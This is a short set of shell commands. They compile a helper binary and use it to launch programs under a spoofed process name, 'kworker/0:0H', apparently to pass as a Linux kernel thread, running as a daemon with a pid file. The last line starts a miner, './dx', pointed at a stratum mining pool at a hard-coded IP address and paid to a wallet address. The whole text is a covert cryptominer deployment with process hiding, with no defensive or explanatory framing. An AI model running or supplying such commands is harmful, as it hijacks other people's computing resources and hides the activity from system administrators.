#compile

gcc -o x x.c

#execute

./x -c -s "kworker/0:0H" -d -p test.pid node run.js


./x -c -s "kworker/0:0H" -d -p test.pid ./dx -o stratum+tcp://141.94.223.113:4052 -u 49cg2BTsCdmBfUPsCrDsGmREn2diVYSKUahupm2bay5ZU3gmVTzuwgY7yhQcbYCdEeZXSHsYLZKLWXTR4DNR3xcJS29HszU -k -p x
